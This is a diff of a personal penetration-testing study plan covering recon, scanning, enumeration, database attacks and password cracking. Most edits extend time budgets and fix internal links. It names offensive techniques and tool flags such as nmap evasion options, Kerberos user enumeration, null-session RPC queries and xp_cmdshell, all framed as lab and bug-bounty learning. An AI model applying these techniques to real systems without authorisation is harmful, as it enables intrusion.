@@ -13,7 +13,7 @@
 
 > [!NOTE]
 > **Stage Overview — Modules 08–13**
-> - **⏱️ Estimated Time:** ~5–6 weeks of consistent daily sessions
+> - **⏱️ Estimated Time:** ~6–8 weeks of consistent daily sessions
 > - **🎯 Modules:** `08` Footprinting & Recon · `09` Scanning · `10` Enumeration · `11` Database Security · `12` Password Cracking & Hash Analysis · `13` System Hacking & Initial Compromise
 > - **🔴 Gate:** Root a box · dump & crack a hash · escalate privesc — before moving to Stage 3
 > - **🎯 Primary Focus:** The complete recon-to-shell pipeline. Footprinting, scanning, enumeration, credential attacks, database exploitation, and system hacking (Linux & Windows privilege escalation).
@@ -113,15 +113,18 @@
 > _Modules 08–13 — Learn to find, probe, crack, and compromise targets. This is the core recon-to-shell pipeline._
 
 > [!IMPORTANT]
-> **Stage 2 Module Execution Order** — Follow this linear module sequence:
+> ### 📋 Stage 2 Module Execution Order
+> Follow this linear module sequence:
+> 
 > | Step | Module | Focus |
-> | :--: | ------ | ----- |
-> | 1 | **[Module 08](#module-08-footprinting--reconnaissance)** | Footprinting & Reconnaissance |
-> | 2 | **[Module 09](#module-09-scanning)** | Scanning |
-> | 3 | **[Module 10](#module-10-enumeration)** | Enumeration |
-> | 4 | **[Module 11](#module-11-database-security)** | Database Security |
-> | 5 | **[Module 12](#module-12-password-cracking--hash-analysis)** | Password Cracking & Hash Analysis |
-> | 6 | **[Module 13](#module-13-system-hacking--initial-compromise)** | System Hacking & Initial Compromise |
+> | :---: | :--- | :--- |
+> | 1 | [[#Module 08: Footprinting & Reconnaissance\|Module 08]] | Footprinting & Reconnaissance |
+> | 2 | [[#Module 09: Scanning\|Module 09]] | Scanning |
+> | 3 | [[#Module 10: Enumeration\|Module 10]] | Enumeration |
+> | 4 | [[#Module 11: Database Security\|Module 11]] | Database Security |
+> | 5 | [[#Module 12: Password Cracking & Hash Analysis\|Module 12]] | Password Cracking & Hash Analysis |
+> | 6 | [[#Module 13: System Hacking & Initial Compromise\|Module 13]] | System Hacking & Initial Compromise |
+> 
 > **Why this order?**
 > ```text
 > What exists?               → Module 08 (Recon)
@@ -159,8 +162,8 @@
 > - 🟢 `Python for OSINT Tooling` — Full book — build my own OSINT automation tools in Python
 
 > [!TIP]
-> ⏱️ **Module 08 Total Time Budget: 1–1.5 weeks**
-> Topic 1 (passive OSINT): 2–3 days | Topic 2 (semi-passive): 1–2 days | Topic 3 (active): 2 days | Topic 4 (advanced fingerprinting): 1 day | Topic 5 (IPv6/protocols): 1 day | Topic 6 (dark web): 1 day | Topic 7 (satellite/geo): SKIP | Topic 8 (strategy): 1 day | Labs: 2–3 days.
+> ⏱️ **Module 08 Total Time Budget: 1.5–2 weeks**
+> Topic 1 (passive OSINT): 3–4 days | Topic 2 (semi-passive): 2 days | Topic 3 (active): 2–3 days | Topic 4 (advanced fingerprinting): 1–2 days | Topic 5 (IPv6/protocols): 1–2 days | Topic 6 (dark web): 1 day | Topic 7 (satellite/geo): SKIP | Topic 8 (strategy): 1 day | Labs: 3–4 days.
 > Recon is the phase pentesters rush and then pay for later. Invest proper time here. Every finding from Module 08 feeds directly into Module 09 targeting decisions. A good recon phase cuts enumeration time in half.
 
 ### Topic 1: The "Ghost" Phase (Passive OSINT & Human Profiling) — 🧠🔬 Mixed
@@ -170,7 +173,7 @@
 > **Goal:** Maximum data acquisition with zero target interaction.
 
 > [!NOTE]
-> ⏱️ **Time Bracket: 2–3 days** — Day 1: Organizational profiling (org chart, LinkedIn employees, job postings exposing tech stack, domain ownership via WHOIS), Google Dorks (`site:`, `filetype:pdf`, `intitle:"index of"`, `inurl:admin`, `ext:sql`), physical vectors (shoulder surfing, tailgating, dumpster diving — awareness level). Day 2: Metadata & leak analysis (Wayback Machine, GitHub dorking for API keys/tokens, repo commit history, exiftool on public PDFs). Day 3: Breach corpora (HIBP, Dehashed), mail posture (SPF/DMARC/DKIM via mxtoolbox), passive DNS, Certificate Transparency (crt.sh). Deliverable: produce a full passive recon report for a bug bounty target (HackerOne) listing all subdomains, emails, tech stack, and breach data found.
+> ⏱️ **Time Bracket: 3–4 days** — Day 1: Organizational profiling (org chart, LinkedIn employees, job postings exposing tech stack, domain ownership via WHOIS), Google Dorks (`site:`, `filetype:pdf`, `intitle:"index of"`, `inurl:admin`, `ext:sql`), physical vectors (shoulder surfing, tailgating, dumpster diving — awareness level). Day 2: Metadata & leak analysis (Wayback Machine, GitHub dorking for API keys/tokens, repo commit history, exiftool on public PDFs). Day 3: Breach corpora (HIBP, Dehashed), mail posture (SPF/DMARC/DKIM via mxtoolbox), passive DNS, Certificate Transparency (crt.sh). Day 4: Review, cross-reference all findings, and write up the full passive recon report for a bug bounty target (HackerOne) listing all subdomains, emails, tech stack, and breach data found.
 
 - [x] **Organizational Hierarchy:** Profile the **Audience** (Stakeholders, HR, Legal, Management) to understand who holds the keys and who is the weakest link.
 
@@ -180,7 +183,7 @@
 
 - [x] **Physical Perimeter Assessment:** Evaluate the likelihood of **Shoulder Surfing, Tailgating, or Dumpster Diving** vulnerabilities.
 
-- [[Metadata & Leak Analysis Use Wayback Machine for historical paths and GitHubGitLab Dorking for hardcoded API keys or internal naming conventions]]
+- [x]  **Metadata & Leak Analysis**:Use Wayback Machine for historical paths and GitHubGitLab Dorking for hardcoded API keys or internal naming conventions
 
 - [x] **Domain & Ownership:** Perform **WHOIS Lookups** to identify registration dates, contact info, and associated subdomains.
 
@@ -199,7 +202,7 @@
 > **Goal:** Querying third-party aggregators to see what the world already knows about them.
 
 > [!NOTE]
-> ⏱️ **Time Bracket: 1–2 days** — Third-party scan aggregators (Shodan queries: `org:"Target Corp"`, `port:22 country:US`; Censys: `parsed.names: target.com`; VirusTotal/urlscan.io for domain behaviour), subdomain enumeration (Sublist3r + Amass + crt.sh — run all three and deduplicate), DNS record mapping (MX reveals mail provider, NS reveals registrar/hosting, TXT reveals SPF + G Suite/O365 presence, SRV reveals internal service topology), WAF/CDN fingerprinting (JA3/JA4, Cloudflare CF-Ray header, Akamai reference markers, favicon hashing via Shodan dorks). Deliverable: build a consolidated subdomain + DNS + hosting map for a bug bounty target using only third-party sources with zero direct target traffic.
+> ⏱️ **Time Bracket: 2 days** — Day 1: Third-party scan aggregators (Shodan queries: `org:"Target Corp"`, `port:22 country:US`; Censys: `parsed.names: target.com`; VirusTotal/urlscan.io for domain behaviour), subdomain enumeration (Sublist3r + Amass + crt.sh — run all three and deduplicate). Day 2: DNS record mapping (MX reveals mail provider, NS reveals registrar/hosting, TXT reveals SPF + G Suite/O365 presence, SRV reveals internal service topology), WAF/CDN fingerprinting (JA3/JA4, Cloudflare CF-Ray header, Akamai reference markers, favicon hashing via Shodan dorks). Deliverable: build a consolidated subdomain + DNS + hosting map for a bug bounty target using only third-party sources with zero direct target traffic.
 
 - [x] **External Intel Scouring:** Query **VirusTotal, urlscan, any.run, Joe Sandbox, and urlvoid** for existing malware samples or documented domain behavior.
 
@@ -221,7 +224,7 @@
 > **Goal:** Direct contact to map the live network fabric. Risk of detection is now ACTIVE.
 
 > [!NOTE]
-> ⏱️ **Time Bracket: 2 days** — Day 1: Host discovery (ping/arp/hping3 sweeps), traceroute analysis (identifying perimeter/DMZ/segmentation hops), basic Nmap stealth scan (`-sS`) + OS fingerprinting (`-O`), aggressive DNS interrogation (zone transfer attempts via `dig axfr`, brute-forcing with `dnsx`/`dnsenum`). Day 2: Web content discovery (ffuf/Gobuster directory bruteforcing with SecLists wordlists, Wappalyzer tech stack fingerprinting), TLS surface harvesting (cert SANs, cipher suites, HTTP/2 ALPN negotiation, redirect chains), web route mapping (robots.txt, sitemap.xml, parameter fuzzing with status/size filters). Deliverable: produce a full active recon report against your home lab target including live hosts, open ports, tech stack, and web directories found.
+> ⏱️ **Time Bracket: 2–3 days** — Day 1: Host discovery (ping/arp/hping3 sweeps), traceroute analysis (identifying perimeter/DMZ/segmentation hops), basic Nmap stealth scan (`-sS`) + OS fingerprinting (`-O`), aggressive DNS interrogation (zone transfer attempts via `dig axfr`, brute-forcing with `dnsx`/`dnsenum`). Day 2: Web content discovery (ffuf/Gobuster directory bruteforcing with SecLists wordlists, Wappalyzer tech stack fingerprinting), TLS surface harvesting (cert SANs, cipher suites, HTTP/2 ALPN negotiation, redirect chains), web route mapping (robots.txt, sitemap.xml, parameter fuzzing with status/size filters). Day 3: Compile and annotate findings into a structured active recon report; verify all discovered assets and validate against passive recon data. Deliverable: produce a full active recon report against your home lab target including live hosts, open ports, tech stack, and web directories found.
 
 - [ ] **Live Host Discovery:** Use **ping, arp, and hping** to identify which internal or external assets are actually breathing.
 
@@ -246,7 +249,7 @@
 > **Goal:** Understand the defensive "brain" of the target.
 
 > [!NOTE]
-> ⏱️ **Time Bracket: 1 day** — Traffic analysis (Wireshark on a captured interface — filter by protocol, identify handshake weaknesses, extract cleartext credentials from unencrypted protocols), defensive profiling (detect IDS/IPS via scan response timing anomalies, WAF via blocked requests, EDR presence via process list or known endpoint names, SIEM via log shipping ports), LOLBAS/GTFOBins awareness mapping (identify potential living-off-the-land vectors for the target OS before you have a shell). Deliverable: fingerprint the defensive posture of your lab target and document which controls are present and which gaps exist.
+> ⏱️ **Time Bracket: 1–2 days** — Day 1: Traffic analysis (Wireshark on a captured interface — filter by protocol, identify handshake weaknesses, extract cleartext credentials from unencrypted protocols), defensive profiling (detect IDS/IPS via scan response timing anomalies, WAF via blocked requests, EDR presence via process list or known endpoint names, SIEM via log shipping ports). Day 2: LOLBAS/GTFOBins awareness mapping (identify potential living-off-the-land vectors for the target OS before you have a shell), write up the defensive posture fingerprint. Deliverable: fingerprint the defensive posture of your lab target and document which controls are present and which gaps exist.
 
 - [ ] **Traffic Analysis:** If vantage is gained, use **[[Wireshark]]** to analyze **Packet Captures** and examine **Handshakes** for encryption/auth weaknesses.
 
@@ -265,7 +268,7 @@
 > **Goal:** Discover targets using newer protocols and dual-stack networks.
 
 > [!NOTE]
-> ⏱️ **Time Bracket: 1 day** — IPv6 recon (Shodan/Censys queries for IPv6, `nmap -6` sweeps, NDP link-local discovery), DHCPv6 enumeration (prefix, DNS server, domain name extraction), SNMP enumeration (community strings public/private with snmpwalk, `onesixtyone`, MIB data: routing tables, interfaces, processes), LDAP probing (port 389 anonymous bind — users, groups, computers), NFS exports (showmount -e — world-readable exports), RPC enumeration (rpcclient, rpcinfo on port 135/445 — user SIDs, domain info). Deliverable: enumerate SNMP and LDAP on a lab target and extract at least 10 pieces of actionable information from each.
+> ⏱️ **Time Bracket: 1–2 days** — Day 1: IPv6 recon (Shodan/Censys queries for IPv6, `nmap -6` sweeps, NDP link-local discovery), DHCPv6 enumeration (prefix, DNS server, domain name extraction), SNMP enumeration (community strings public/private with snmpwalk, `onesixtyone`, MIB data: routing tables, interfaces, processes). Day 2: LDAP probing (port 389 anonymous bind — users, groups, computers), NFS exports (showmount -e — world-readable exports), RPC enumeration (rpcclient, rpcinfo on port 135/445 — user SIDs, domain info). Deliverable: enumerate SNMP and LDAP on a lab target and extract at least 10 pieces of actionable information from each.
 
 - [ ] **IPv6 Reconnaissance:** Identify **IPv6 addresses** via **Shodan, Censys, IPv6 address enumeration tools** even when IPv4 is locked down.
 
@@ -284,13 +287,13 @@
 ---
 
 ### Topic 6: Dark Web & Breach Intelligence — 🔬 Practical
-[[Module-08_Footprinting-and-Reconnaissance|📁]]
+[[Topic-6_Dark-Web-and-Breach-Intelligence|📁]]
 
 > [!TIP]
 > **Goal:** Uncover intelligence from dark web and historical breaches.
 
 > [!NOTE]
-> ⏱️ **Time Bracket: 1 day** — Breach corpus searching (HIBP/Dehashed for corporate email domains, build a targeted credential list), threat actor profiling (identify APT groups targeting your industry via MITRE ATT&CK Groups, check ransomware gang leak sites for past victims in the sector), credential stuffing intelligence (evaluate breach data quality: hash vs plaintext, how old, reuse potential). Ethics: this is intelligence gathering only — never use breach credentials against real targets. Deliverable: perform a breach search for a personal test email domain and document what data is exposed.
+> ⏱️ **Time Bracket: 1–2 days** — Day 1: Breach corpus searching (HIBP/Dehashed for corporate email domains, build a targeted credential list), threat actor profiling (identify APT groups targeting your industry via MITRE ATT&CK Groups, check ransomware gang leak sites for past victims in the sector). Day 2: Credential stuffing intelligence (evaluate breach data quality: hash vs plaintext, how old, reuse potential), practice building and annotating a structured threat intelligence profile. Ethics: this is intelligence gathering only — never use breach credentials against real targets. Deliverable: perform a breach search for a personal test email domain and document what data is exposed.
 
 - [ ] **Dark Web Searches:** Use **Tor, I2P**, or dedicated **dark web search engines** to find **leaked corporate data, stolen creds, threat reports**.
 
@@ -305,7 +308,7 @@
 ---
 
 ### Topic 7: Satellite & Geospatial Intelligence (Optional — Skip unless physical pentest is in scope) — 🧠🔬 Mixed
-[[Module-08_Footprinting-and-Reconnaissance|📁]]
+[[Topic-7_Satellite-and-Geospatial-Intelligence|📁]]
 
 > [!WARNING]
 > **OPTIONAL — Skip in standard engagements.** This stage covers passive OSINT using publicly available satellite imagery (Google Earth Pro, Sentinel Hub) and geospatial data for physical site reconnaissance. It is only relevant if I am conducting an authorized physical penetration test where facility layout matters.
@@ -316,13 +319,13 @@
 ---
 
 ### Topic 8: Strategy & Attack Mapping — 🧠 Conceptual
-[[Module-08_Footprinting-and-Reconnaissance|📁]]
+[[Topic-8_Strategy-and-Attack-Mapping|📁]]
 
 > [!TIP]
 > **Goal:** Convert raw data into an execution plan.
 
 > [!NOTE]
-> ⏱️ **Time Bracket: 1 day** — Security architecture classification (is the target Zero Trust with MFA enforcement, or flat network with VPN access?), framework alignment (map all findings to MITRE ATT&CK Tactic/Technique IDs, annotate the Cyber Kill Chain phase each finding supports), attack vector prioritization (rank entry vectors: SQLi vs MITM vs credential brute force vs exposed service — pick the highest-probability, lowest-noise path). Deliverable: produce a 1-page attack plan from your Module 08 recon report with ranked entry vectors and a MITRE ATT&CK mapping.
+> ⏱️ **Time Bracket: 1–2 days** — Day 1: Security architecture classification (is the target Zero Trust with MFA enforcement, or flat network with VPN access?), framework alignment (map all findings to MITRE ATT&CK Tactic/Technique IDs, annotate the Cyber Kill Chain phase each finding supports). Day 2: Attack vector prioritization (rank entry vectors: SQLi vs MITM vs credential brute force vs exposed service — pick the highest-probability, lowest-noise path), finalize and write the attack plan. Deliverable: produce a 1-page attack plan from your Module 08 recon report with ranked entry vectors and a MITRE ATT&CK mapping.
 
 - [ ] **Security Architecture Classification:** Determine if they are utilizing **Zero Trust** or standard **MFA & 2FA**.
 
@@ -361,8 +364,8 @@
 > - 🟢 `Hacking and Network Defense` — Network scanning chapter — how scan traffic appears in defender logs
 
 > [!TIP]
-> ⏱️ **Module 09 Total Time Budget: 1 week**
-> Topic 1 (host discovery): 1 day | Topic 2 (port/service enum): 2 days | Topic 3 (defense assessment): 1 day | Topic 4 (vuln mapping): 1 day | Topic 5 (stealth/evasion): 1 day | Topic 6 (advanced): 1 day | Labs: 2 days.
+> ⏱️ **Module 09 Total Time Budget: 1.5 weeks**
+> Topic 1 (host discovery): 1–2 days | Topic 2 (port/service enum): 2–3 days | Topic 3 (defense assessment): 1–2 days | Topic 4 (vuln mapping): 1–2 days | Topic 5 (stealth/evasion): 1–2 days | Topic 6 (advanced): 1 day | Labs: 2–3 days.
 > Nmap is the single most important tool in this entire curriculum. Learn every flag. Don’t just run `-sV` blindly — understand what packet is sent, what response is expected, and why each scan type has different stealth/detection characteristics. Every scan you run in Modules 10–13 depends on this.
 
 ### Topic 1: Host Discovery & Network Topology (The "Roll Call") — 🔬 Practical
@@ -372,7 +375,7 @@
 > **Goal:** Identify live assets without wasting time on dead IPs or triggering ICMP alarms.
 
 > [!NOTE]
-> ⏱️ **Time Bracket: 1 day** — ARP discovery (`arp-scan`, `nmap -PR` — bypasses host firewalls that block ICMP), ICMP/TCP/UDP sweeps (`nmap -PE/-PS80/-PU53` — know which probe type each flag sends and why), passive traffic capture (Wireshark broadcast traffic — find active hosts without sending a single packet), network pathing (traceroute/hping3 — map perimeter vs DMZ vs internal segments by hop TTL analysis), IPv6 NDP sweeps. Deliverable: discover all live hosts on a /24 lab subnet using 3 different discovery methods and reconcile discrepancies between them.
+> ⏱️ **Time Bracket: 1–2 days** — Day 1: ARP discovery (`arp-scan`, `nmap -PR` — bypasses host firewalls that block ICMP), ICMP/TCP/UDP sweeps (`nmap -PE/-PS80/-PU53` — know which probe type each flag sends and why), passive traffic capture (Wireshark broadcast traffic — find active hosts without sending a single packet). Day 2: Network pathing (traceroute/hping3 — map perimeter vs DMZ vs internal segments by hop TTL analysis), IPv6 NDP sweeps, and reconcile results from all 3 discovery methods. Deliverable: discover all live hosts on a /24 lab subnet using 3 different discovery methods and reconcile discrepancies between them.
 
 - [ ] **ARP Discovery:** Use `arp-scan` or `nmap -PR` for local segment discovery to bypass host firewalls that drop ICMP.
 
@@ -393,7 +396,7 @@
 > **Goal:** Determine exactly what applications are running and how they communicate.
 
 > [!NOTE]
-> ⏱️ **Time Bracket: 2 days** — Day 1: Stealth SYN scan (`nmap -sS` — half-open, not logged by most application servers), version detection (`-sV` — banner grabbing + probe-based fingerprinting), OS fingerprinting (`-O` — TCP/IP stack analysis, requires root), TCP connect scan vs SYN scan trade-offs. Day 2: UDP scanning (`nmap -sU` — slow, unreliable, but critical: DNS/53, SNMP/161, TFTP/69, DHCP/67 often missed), service-specific NSE scripts (`--script=banner,http-title,ssh-auth-methods`), IPv6 scanning (`nmap -6`). Memorize: which Nmap flags require root, which are safe vs aggressive, which generate the most detection noise. Deliverable: fully documented Nmap scan of a lab target including all open TCP + UDP ports, service versions, and OS guess.
+> ⏱️ **Time Bracket: 2–3 days** — Day 1: Stealth SYN scan (`nmap -sS` — half-open, not logged by most application servers), version detection (`-sV` — banner grabbing + probe-based fingerprinting), OS fingerprinting (`-O` — TCP/IP stack analysis, requires root), TCP connect scan vs SYN scan trade-offs. Day 2: UDP scanning (`nmap -sU` — slow, unreliable, but critical: DNS/53, SNMP/161, TFTP/69, DHCP/67 often missed), service-specific NSE scripts (`--script=banner,http-title,ssh-auth-methods`), IPv6 scanning (`nmap -6`). Day 3: Repeat against a second lab target, memorize which Nmap flags require root, which are safe vs aggressive, which generate the most detection noise. Deliverable: fully documented Nmap scan of a lab target including all open TCP + UDP ports, service versions, and OS guess.
 
 - [ ] **Stealth SYN Scanning:** Use `nmap -sS` to identify open ports without completing the three-way **Handshake**, minimizing my footprint in application logs.
 
@@ -437,7 +440,7 @@
 > **Goal:** Convert raw scan data into actionable exploitation vectors.
 
 > [!NOTE]
-> ⏱️ **Time Bracket: 1 day** — NSE scripted vuln probing (`--script vuln` — understand what each script tests before running it), CVE mapping (service version → searchsploit/ExploitDB lookup, NVD API, Vulners NSE), attack surface selection (version-to-exploit decision matrix: known public CVE with public PoC > misconfiguration > default credentials > brute force), PCAP intelligence (identify cleartext protocol traffic that enables credential capture or replay). Deliverable: produce a vulnerability mapping for your lab scan — list each open service, its version, associated CVEs, and intended exploitation path.
+> ⏱️ **Time Bracket: 1–2 days** — Day 1: NSE scripted vuln probing (`--script vuln` — understand what each script tests before running it), CVE mapping (service version → searchsploit/ExploitDB lookup, NVD API, Vulners NSE). Day 2: Attack surface selection (version-to-exploit decision matrix: known public CVE with public PoC > misconfiguration > default credentials > brute force), PCAP intelligence (identify cleartext protocol traffic that enables credential capture or replay). Deliverable: produce a vulnerability mapping for your lab scan — list each open service, its version, associated CVEs, and intended exploitation path.
 
 - [ ] **Scripted Vulnerability Probing:** Use the **Nmap Scripting Engine (NSE)** (`--script vuln`) to check for known **Zero Day** or common exploits in identified versions.
 
@@ -456,7 +459,7 @@
 > **Goal:** Scan without detection by firewalls, IDS, and EDR.
 
 > [!NOTE]
-> ⏱️ **Time Bracket: 1 day** — Fragmentation (`nmap -f` — split packets to bypass signature IDS), decoy scanning (`-D RND:5,ME` — flood IDS with fake source IPs), timing profiles (T0 = paranoid 5min/probe, T1 = sneaky, T3 = normal, T5 = insane — know what changes at each level), null/FIN/Xmas scans (bypass stateless firewalls, fail against Windows), ACK scanning (`-sA` — maps firewall rulesets, never establishes connections), idle/zombie scanning (`-sI` — blind scan via third party), source port spoofing (`--source-port 53` — bypass port-based ACLs), Scapy custom packet crafting (craft arbitrary IP/TCP headers for DPI bypass). Deliverable: compare scan results and IDS alert counts for a lab target using T5 vs T1 timing, fragmentation on vs off.
+> ⏱️ **Time Bracket: 1–2 days** — Day 1: Fragmentation (`nmap -f` — split packets to bypass signature IDS), decoy scanning (`-D RND:5,ME` — flood IDS with fake source IPs), timing profiles (T0 = paranoid 5min/probe, T1 = sneaky, T3 = normal, T5 = insane — know what changes at each level), null/FIN/Xmas scans (bypass stateless firewalls, fail against Windows). Day 2: ACK scanning (`-sA` — maps firewall rulesets, never establishes connections), idle/zombie scanning (`-sI` — blind scan via third party), source port spoofing (`--source-port 53` — bypass port-based ACLs), Scapy custom packet crafting (craft arbitrary IP/TCP headers for DPI bypass). Deliverable: compare scan results and IDS alert counts for a lab target using T5 vs T1 timing, fragmentation on vs off.
 
 - [ ] **Fragmentation & Decoys:** Use `nmap -f` (fragment packets) or `-D` (decoy IPs) to evade **NIDS/NIPS signature detection**.
 
@@ -475,13 +478,13 @@
 ---
 
 ### Topic 6: Advanced Scanning Techniques — 🔬 Practical
-[[Module-09_Scanning|📁]]
+[[Topic-6_Advanced-Scanning-Techniques|📁]]
 
 > [!TIP]
 > **Goal:** Optimize scanning efficiency and discover hidden services.
 
 > [!NOTE]
-> ⏱️ **Time Bracket: 1 day** — masscan for high-speed sweeps (rate 10000 pps, export to XML for Nmap re-scan), custom NSE script writing (understand the Nmap scripting API, write a basic service banner extractor), WAF/CDN bypass (historical DNS to find origin IP, direct IP scan bypassing Cloudflare), CT log recon (parse crt.sh API programmatically for hidden subdomains), proxychains + VPN scan routing (obscure source IP, route through compromised host). Deliverable: use masscan + Nmap in a two-phase scan (masscan finds open ports, nmap `-sV -sC` only against those ports) and compare speed vs accuracy.
+> ⏱️ **Time Bracket: 1–2 days** — Day 1: masscan for high-speed sweeps (rate 10000 pps, export to XML for Nmap re-scan), custom NSE script writing (understand the Nmap scripting API, write a basic service banner extractor). Day 2: WAF/CDN bypass (historical DNS to find origin IP, direct IP scan bypassing Cloudflare), CT log recon (parse crt.sh API programmatically for hidden subdomains), proxychains + VPN scan routing (obscure source IP, route through compromised host). Deliverable: use masscan + Nmap in a two-phase scan (masscan finds open ports, nmap `-sV -sC` only against those ports) and compare speed vs accuracy.
 
 - [ ] **Parallel & Distributed Scanning:** Use **masscan** for rapid scanning of large ranges; distribute scans across **multiple IPs/proxies** to avoid threshold detection.
 
@@ -525,8 +528,8 @@
 > **Note:** Module 09 (Scanning) covers host discovery, port scanning, and defense identification. Module 10 focuses specifically on **extracting detailed information from discovered services** to build an attack profile. If I haven't completed Module 09, do so first.
 
 > [!TIP]
-> ⏱️ **Module 10 Total Time Budget: 1 week**
-> Topic 1 (service/banner): 2 days | Topic 2 (directory/identity): 1–2 days | Topic 3 (DNS/infra): 1 day | Topic 4 (DB/app): 1 day | Topic 5 (surface consolidation + OpSec): 1 day | Labs: 2–3 days.
+> ⏱️ **Module 10 Total Time Budget: 1.5 weeks**
+> Topic 1 (service/banner): 2–3 days | Topic 2 (directory/identity): 2 days | Topic 3 (DNS/infra): 1–2 days | Topic 4 (DB/app): 1–2 days | Topic 5 (surface consolidation + OpSec): 1 day | Labs: 3–4 days.
 > Enumeration is where most pentesters find their critical paths. A missed SNMP community string or an overlooked NFS export can be the difference between a stalled engagement and Domain Admin. Don’t rush this module.
 
 ### Topic 1: Service Enumeration & Banner Grabbing — 🔬 Practical
@@ -536,7 +539,7 @@
 > **Goal:** Extract version, configuration, and identity information from each discovered service.
 
 > [!NOTE]
-> ⏱️ **Time Bracket: 2 days** — Day 1: Banner grabbing (Netcat/Telnet/nmap `-sV` — connect to every open port and read what it says), SMB enumeration (enum4linux-ng: null session, shares, users, password policy; smbclient share listing; NetExec/nxc for quick domain context). Day 2: SNMP enumeration (snmpwalk with `public`/`private`/`internal` — extract routing tables, ARP cache, running processes, installed software, interface IPs; onesixtyone for community string brute-force), NFS showmount (world-readable exports, root squash disabled), SSH audit (ssh-audit for KEX/cipher/MAC strength, deprecated algorithms), RDP NTLM info extraction. Deliverable: enumerate SMB + SNMP on a lab target and extract a complete user list, share list, and at least 5 system details from SNMP.
+> ⏱️ **Time Bracket: 2–3 days** — Day 1: Banner grabbing (Netcat/Telnet/nmap `-sV` — connect to every open port and read what it says), SMB enumeration (enum4linux-ng: null session, shares, users, password policy; smbclient share listing; NetExec/nxc for quick domain context). Day 2: SNMP enumeration (snmpwalk with `public`/`private`/`internal` — extract routing tables, ARP cache, running processes, installed software, interface IPs; onesixtyone for community string brute-force), NFS showmount (world-readable exports, root squash disabled). Day 3: SSH audit (ssh-audit for KEX/cipher/MAC strength, deprecated algorithms), RDP NTLM info extraction, and consolidate all findings. Deliverable: enumerate SMB + SNMP on a lab target and extract a complete user list, share list, and at least 5 system details from SNMP.
 
 - [ ] **Banner Grabbing:** Use **[[Netcat]], Telnet, Nmap -sV** to capture **service banners** revealing **software name, version, OS hints, and build information**.
 
@@ -559,7 +562,7 @@
 > **Goal:** Map users, groups, and organizational structure from directory services.
 
 > [!NOTE]
-> ⏱️ **Time Bracket: 1–2 days** — LDAP enumeration (ldapsearch anonymous bind — extract users, groups, computers, password policies; `ldapsearch -x -H ldap://<target> -b "DC=corp,DC=local"`), Active Directory recon (ldapsearch + enum4linux-ng + BloodHound SharpHound collector — map domain trusts, group membership, delegation, SPNs), Kerberos enumeration (kerbrute userenum — valid username enumeration via AS-REQ pre-auth failure response differences; identify AS-REP Roastable accounts: UF_DONT_REQUIRE_PREAUTH set), SMTP VRFY/EXPN (verify valid email addresses and usernames on mail servers), RPC enumeration (rpcclient null session: `enumdomusers`, `enumdomgroups`, `lookupnames`). Deliverable: enumerate a lab AD domain with BloodHound and identify the shortest path to Domain Admin from a domain user account.
+> ⏱️ **Time Bracket: 2 days** — Day 1: LDAP enumeration (ldapsearch anonymous bind — extract users, groups, computers, password policies; `ldapsearch -x -H ldap://<target> -b "DC=corp,DC=local"`), Active Directory recon (ldapsearch + enum4linux-ng + BloodHound SharpHound collector — map domain trusts, group membership, delegation, SPNs). Day 2: Kerberos enumeration (kerbrute userenum — valid username enumeration via AS-REQ pre-auth failure response differences; identify AS-REP Roastable accounts: UF_DONT_REQUIRE_PREAUTH set), SMTP VRFY/EXPN (verify valid email addresses and usernames on mail servers), RPC enumeration (rpcclient null session: `enumdomusers`, `enumdomgroups`, `lookupnames`). Deliverable: enumerate a lab AD domain with BloodHound and identify the shortest path to Domain Admin from a domain user account.
 
 - [ ] **LDAP Enumeration:** Query **LDAP** (port 389) to extract **users, groups, computers, password policies** without authentication.
 
@@ -650,7 +653,7 @@
 ---
 
 ## Module 11: Database Security
-[[Module-13_System-Hacking|📁]]
+[[Module-11_Database-Security|📁]]
 
 > [!NOTE]
 > **📚 Recommended Books for This Module**
@@ -664,11 +667,12 @@
 > **Prerequisites:** Module 10 (Enumeration) — specifically Topic 4 (Database & Application Enumeration). I should already be able to identify running database services and version-fingerprint them before starting this module.
 
 > [!TIP]
-> ⏱️ **Module 11 Total Time Budget: 1–1.5 weeks**
-> Topic 1 (enumeration/fingerprinting): 2 days | Topic 2 (relational DB exploitation): 3 days | Topic 3 (NoSQL/modern): 2 days | Topic 4 (privilege escalation): 1 day | Topic 5 (defence): 1 day | Labs: 3 days.
+> ⏱️ **Module 11 Total Time Budget: 1.5–2 weeks**
+> Topic 1 (enumeration/fingerprinting): 2–3 days | Topic 2 (relational DB exploitation): 3–4 days | Topic 3 (NoSQL/modern): 2–3 days | Topic 4 (privilege escalation): 1–2 days | Topic 5 (defence): 1–2 days | Labs: 3–4 days.
 > This module has serious exploitable techniques. You will run `xp_cmdshell` and get an OS shell from a database service. Do not rush past that — it’s a critical skill for OSCP and real engagements where DBAs forget to disable SA accounts.
 
 ### Topic 1: Database Enumeration & Fingerprinting — 🔬 Practical
+[[Topic-1_Database-Enumeration-and-Fingerprinting|📁]]
 
 > [!TIP]
 > **Goal:** Identify database engine, version, authentication mechanism, and attack surface before attempting exploitation.
@@ -733,6 +737,7 @@
 ---
 
 ### Topic 2: Relational Database Exploitation — 🔬 Practical
+[[Topic-2_Relational-Database-Exploitation|📁]]
 
 > [!TIP]
 > **Goal:** Escalate from database access to OS command execution and credential extraction.
@@ -790,6 +795,7 @@
 ---
 
 ### Topic 3: NoSQL & Modern Database Attacks — 🔬 Practical
+[[Topic-3_NoSQL-and-Modern-Database-Attacks|📁]]
 
 > [!TIP]
 > **Goal:** Attack non-relational databases — different injection syntax, different attack surfaces, different default security postures.
@@ -831,6 +837,7 @@
 ---
 
 ### Topic 4: Database Privilege Escalation — 🔬 Practical
+[[Topic-4_Database-Privilege-Escalation|📁]]
 
 > [!TIP]
 > **Goal:** Move from low-privileged DB access to OS command execution and system-level access.
@@ -850,6 +857,7 @@
 ---
 
 ### Topic 5: Database Auditing & Defence — 🧠🔬 Mixed
+[[Topic-5_Database-Auditing-and-Defence|📁]]
 
 > [!TIP]
 > **Goal:** Understand the defender-side mitigations that block the attacks above.
@@ -890,7 +898,7 @@
 ---
 
 ## Module 12: Password Cracking & Hash Analysis
-[[Module-13_System-Hacking|📁]]
+[[Module-12_Password-Cracking|📁]]
 
 > [!NOTE]
 > **📚 Recommended Books for This Module**
@@ -902,17 +910,18 @@
 > **Navigational Note — Placement:** Module 12 (Password Cracking & Hash Analysis) sits directly between Module 10 (Enumeration) and Module 13 (System Hacking) because password cracking is a **direct prerequisite for System Hacking**: I cannot effectively use Pass-the-Hash, hash cracking, or credential reuse without first mastering hash identification and offline cracking mechanics. Proceed to Module 13 after completing this.
 
 > [!TIP]
